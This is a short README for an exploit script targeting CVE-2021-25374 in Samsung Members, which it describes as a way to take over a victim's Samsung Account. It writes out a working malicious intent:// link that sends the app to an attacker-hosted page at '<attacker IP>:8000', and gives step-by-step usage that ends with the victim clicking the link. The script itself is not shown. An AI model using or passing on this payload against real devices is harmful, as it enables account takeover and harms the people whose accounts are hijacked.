# CVE-2021-25374 - Samsung Account Access Script

This script can be used to gain access to a victim's Samsung Account if they have a specific version of Samsung Members installed on their Samsung Device, and if the victim's device is from the US or Korea region.

## How to use this script:

1) Host a web server and have it host a web page with the following link:

`<a href="intent://launch?url=http://<attacker IP>:8000/yay.html&action=sso&from=ZZ&iso=ZZ#Intent;scheme=samsungrewards;package=com.samsung.android.voc;action=android.intent.action.VIEW;end;">yay click here yay</a>`

NOTE: replace "\<attacker IP\>" with the IP address that you'll be running this script from.

2) Run this script

`python3 ./samsung_account_access.py`

3) Using a Samsung Phone, browse to the web server and click on the link

4) Let the script do its thing

More information about the issue this script exploits can be found here: <placeholder>
